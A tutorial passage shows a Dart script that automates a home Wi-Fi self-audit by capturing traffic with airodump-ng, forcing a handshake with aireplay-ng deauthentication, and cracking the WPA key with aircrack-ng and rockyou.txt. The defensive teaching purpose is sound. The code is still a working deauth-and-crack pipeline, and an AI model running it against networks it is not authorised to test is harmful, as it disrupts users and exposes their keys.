Learn by Example.Project 5: Automating a Recurring Home N:
## Goal

Since you're working in pure Dart, wrap the manual workflow from Project 2 into a small Dart CLI tool that runs a scheduled self-audit of your own network's PSK strength against a wordlist, and reports whether it survived.

This project treats `aircrack-ng`'s CLI tools as external processes orchestrated from Dart — a realistic pattern for building any security tooling on top of this suite.

## Design

The Dart script will:

1. Shell out to `airodump-ng` for a fixed capture window.
2. Shell out to `aireplay-ng` to trigger a handshake.
3. Shell out to `aircrack-ng` against a wordlist you control.
4. Parse the exit status/output to report pass/fail.

## Code

```dart
import 'dart:io';

const bssid = 'AA:BB:CC:DD:EE:FF'; // your own router only
const clientMac = '11:22:33:44:55:66'; // your own test client only
const iface = 'wlan1mon';
const channel = '6';
const captureFile = 'audit-capture';
const wordlist = 'rockyou.txt';

Future<void> main() async {
  print('Starting capture window...');
  final capture = await Process.start('sudo', [
    'airodump-ng',
    '--bssid', bssid,
    '--channel', channel,
    '--write', captureFile,
    iface,
  ]);

  // Give airodump-ng a moment to start listening before we deauth.
  await Future.delayed(const Duration(seconds: 3));

  print('Triggering handshake via deauth...');
  final deauth = await Process.run('sudo', [
    'aireplay-ng',
    '--deauth', '5',
    '-a', bssid,
    '-c', clientMac,
    iface,
  ]);
  stdout.write(deauth.stdout);

  // Give the client time to reconnect and complete the handshake.
  await Future.delayed(const Duration(seconds: 10));
  capture.kill(ProcessSignal.sigint);
  await capture.exitCode;

  print('Running crack attempt against $wordlist...');
  final crack = await Process.run('aircrack-ng', [
    '-w', wordlist,
    '-b', bssid,
    '$captureFile-01.cap',
  ]);

  final output = crack.stdout.toString();
  if (output.contains('KEY FOUND!')) {
    print('WARNING: your PSK was cracked by this wordlist. Rotate it.');
  } else {
    print('PSK survived this wordlist. No action needed this run.');
  }
}
```

Run it with:

```bash
dart run audit.dart
```

Schedule it (e.g. via a systemd timer or cron on Arch) to re-run monthly, so you get an early warning if your password ever becomes crackable against updated public wordlists — a genuinely useful, entirely legal use of the full aircrack-ng pipeline.

## What you learned

How to treat the aircrack-ng suite as a set of composable Unix processes rather than a single monolithic tool — the same pattern used by real, production security-auditing pipelines, just scaled down to a single home network you own.
